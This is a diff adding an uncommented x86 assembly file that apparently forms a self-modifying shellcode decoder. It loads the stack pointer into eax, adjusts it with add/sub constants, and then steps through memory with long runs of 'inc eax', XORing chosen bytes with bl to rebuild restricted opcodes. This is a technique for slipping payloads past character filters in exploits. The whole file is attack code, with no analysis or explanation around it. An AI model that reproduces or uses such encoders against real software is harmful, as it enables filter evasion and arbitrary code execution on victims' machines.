@@ -1,0 +1,366 @@
+push esp
+pop eax
+add eax, 0x50005000
+sub eax, 0x50005100
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+dec ebx
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
+inc eax
+xor byte ptr [eax], bl
